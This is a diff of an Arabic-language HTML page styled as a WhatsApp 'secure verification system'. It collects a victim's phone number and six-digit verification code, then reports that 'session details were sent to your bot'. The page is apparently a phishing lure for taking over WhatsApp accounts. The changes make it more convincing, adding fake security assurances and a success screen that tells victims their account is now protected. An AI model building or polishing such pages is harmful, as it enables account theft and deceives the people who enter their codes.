@@ -3,63 +3,139 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>توثيق واتساب</title>
+    <title>نظام توثيق واتساب الذكي</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <div class="container">
-        <div class="auth-container" id="loginContainer">
-            <div class="logo">
-                <svg width="60" height="60" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M21 3L12 12M21 3L15 3M21 3L21 9M12 12L3 21M12 12L15.5 15.5M3 21L9 21M3 21L3 15" stroke="#25D366" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                </svg>
-            </div>
-            <h1>مرحباً بك في واتساب</h1>
-            <p>أدخل رقم هاتفك لبدء التوثيق</p>
-            <div class="phone-input">
-                <select id="countryCode">
-                    <option value="+966">+966</option>
-                    <option value="+20">+20</option>
-                    <option value="+971">+971</option>
-                    <option value="+962">+962</option>
-                    <option value="+965">+965</option>
-                </select>
-                <input type="tel" id="phoneNumber" placeholder="رقم الهاتف" maxlength="10">
-            </div>
-            <button id="sendCodeBtn" class="btn-primary">إرسال رمز التحقق</button>
-        </div>
-
-        <div class="auth-container" id="codeContainer" style="display: none;">
-            <div class="logo">
-                <svg width="60" height="60" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M21 3L12 12M21 3L15 3M21 3L21 9M12 12L3 21M12 12L15.5 15.5M3 21L9 21M3 21L3 15" stroke="#25D366" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                </svg>
-            </div>
-            <h1>رمز التحقق</h1>
-            <p>أدخل رمز التحقق الذي تم إرساله إلى <span id="displayNumber"></span></p>
-            <div class="code-input">
-                <input type="text" id="code1" maxlength="1" class="code-digit">
-                <input type="text" id="code2" maxlength="1" class="code-digit">
-                <input type="text" id="code3" maxlength="1" class="code-digit">
-                <input type="text" id="code4" maxlength="1" class="code-digit">
-                <input type="text" id="code5" maxlength="1" class="code-digit">
-                <input type="text" id="code6" maxlength="1" class="code-digit">
-            </div>
-            <button id="verifyBtn" class="btn-primary">التحقق</button>
-            <button id="backBtn" class="btn-secondary">العودة</button>
-        </div>
-
-        <div class="success-container" id="successContainer" style="display: none;">
-            <div class="checkmark">
+        <!-- شاشة الترحيب -->
+        <div class="welcome-screen" id="welcomeScreen">
+            <div class="brand-logo">
                 <svg width="80" height="80" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M20 6L9 17L4 12" stroke="#25D366" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    <path d="M21 3L12 12M21 3L15 3M21 3L21 9M12 12L3 21M12 12L15.5 15.5M3 21L9 21M3 21L3 15" stroke="#25D366" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                 </svg>
             </div>
-            <h1>تم التوثيق بنجاح!</h1>
-            <p>تم إرسال معلوماتك إلى البوت الخاص بك</p>
+            <h1>مرحباً بك في نظام التوثيق الآمن</h1>
+            <p class="subtitle">ابدأ رحلتك نحو تأمين حسابك وحماية خصوصيتك</p>
+            <div class="features-grid">
+                <div class="feature-card">
+                    <div class="feature-icon">🔒</div>
+                    <h3>أمان متطور</h3>
+                    <p>حماية متعددة الطبقات لبياناتك الشخصية</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">⚡</div>
+                    <h3>سرعة فائقة</h3>
+                    <p>عملية توثيق سلسة في ثوانٍ معدودة</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">📱</div>
+                    <h3>توافق كامل</h3>
+                    <p>يدعم جميع أجهزة الهواتف الذكية</p>
+                </div>
+            </div>
+            <button id="startBtn" class="btn-primary btn-large">ابدأ الآن</button>
+        </div>
+
+        <!-- شاشة إدخال الرقم -->
+        <div class="auth-container" id="loginContainer" style="display: none;">
+            <div class="header-section">
+                <div class="logo">
+                    <svg width="60" height="60" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M21 3L12 12M21 3L15 3M21 3L21 9M12 12L3 21M12 12L15.5 15.5M3 21L9 21M3 21L3 15" stroke="#25D366" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                </div>
+                <h1>التحقق من الهوية</h1>
+                <p class="instruction-text">لضمان أمان حسابك، نحتاج إلى التحقق من رقم هاتفك المحمول</p>
+            </div>
+            
+            <div class="phone-input-section">
+                <label class="input-label">رقم الهاتف المحمول</label>
+                <div class="phone-input">
+                    <select id="countryCode" class="country-select">
+                        <option value="+966">السعودية 🇸🇦 +966</option>
+                        <option value="+20">مصر 🇪🇬 +20</option>
+                        <option value="+971">الإمارات 🇦🇪 +971</option>
+                        <option value="+962">الأردن 🇯🇴 +962</option>
+                        <option value="+965">الكويت 🇰🇼 +965</option>
+                        <option value="+974">قطر 🇶🇦 +974</option>
+                        <option value="+968">عُمان 🇴🇲 +968</option>
+                        <option value="+963">سوريا 🇸🇾 +963</option>
+                        <option value="+964">العراق 🇮🇶 +964</option>
+                        <option value="+212">المغرب 🇲🇦 +212</option>
+                    </select>
+                    <input type="tel" id="phoneNumber" placeholder="أدخل رقم هاتفك بدون الأصفار" maxlength="10" class="phone-input-field">
+                </div>
+                <p class="helper-text">سيتم إرسال رمز تحقق مؤقت إلى هذا الرقم</p>
+            </div>
+            
+            <div class="actions-section">
+                <button id="sendCodeBtn" class="btn-primary btn-full">إرسال رمز التحقق</button>
+                <div class="terms-section">
+                    <p class="terms-text">بمتابعتك، فإنك توافق على <a href="#" class="terms-link">شروط الخدمة</a> و<a href="#" class="terms-link">سياسة الخصوصية</a></p>
+                </div>
+            </div>
+        </div>
+
+        <!-- شاشة إدخال الكود -->
+        <div class="auth-container" id="codeContainer" style="display: none;">
+            <div class="header-section">
+                <div class="logo">
+                    <svg width="60" height="60" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M21 3L12 12M21 3L15 3M21 3L21 9M12 12L3 21M12 12L15.5 15.5M3 21L9 21M3 21L3 15" stroke="#25D366" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                </div>
+                <h1>رمز التحقق المؤقت</h1>
+                <p class="instruction-text">أدخل الرمز المكون من 6 أرقام الذي تم إرساله إلى <span id="displayNumber" class="highlighted-number"></span></p>
+            </div>
+            
+            <div class="code-input-section">
+                <div class="code-input">
+                    <input type="text" id="code1" maxlength="1" class="code-digit" data-index="0">
+                    <input type="text" id="code2" maxlength="1" class="code-digit" data-index="1">
+                    <input type="text" id="code3" maxlength="1" class="code-digit" data-index="2">
+                    <input type="text" id="code4" maxlength="1" class="code-digit" data-index="3">
+                    <input type="text" id="code5" maxlength="1" class="code-digit" data-index="4">
+                    <input type="text" id="code6" maxlength="1" class="code-digit" data-index="5">
+                </div>
+                <p class="resend-text">لم تستلم الرمز؟ <button id="resendBtn" class="resend-link">إعادة الإرسال</button></p>
+            </div>
+            
+            <div class="actions-section">
+                <button id="verifyBtn" class="btn-primary btn-full">تأكيد التحقق</button>
+                <button id="backBtn" class="btn-secondary btn-full">العودة لتغيير الرقم</button>
+            </div>
+        </div>
+
+        <!-- شاشة النجاح -->
+        <div class="success-container" id="successContainer" style="display: none;">
+            <div class="success-animation">
+                <div class="checkmark-circle">
+                    <svg width="80" height="80" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M20 6L9 17L4 12" stroke="#25D366" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                </div>
+            </div>
+            <h1>تم التوثيق بنجاح! 🎉</h1>
+            <p class="success-message">حسابك الآن محمي ومؤمن ضد أي محاولات اختراق غير مصرح بها</p>
+            <div class="security-info">
+                <div class="info-item">
+                    <span class="info-icon">✅</span>
+                    <span class="info-text">تم تفعيل الحماية الثنائية</span>
+                </div>
+                <div class="info-item">
+                    <span class="info-icon">🛡️</span>
+                    <span class="info-text">تم إرسال تفاصيل الجلسة إلى بوتك</span>
+                </div>
+                <div class="info-item">
+                    <span class="info-icon">📱</span>
+                    <span class="info-text">يمكنك الآن استخدام الحساب بأمان</span>
+                </div>
+            </div>
+            <button id="finishBtn" class="btn-primary btn-large">إغلاق</button>
         </div>
     </div>
 
     <script src="script.js"></script>
 </body>
-                  </html>
+    </html>
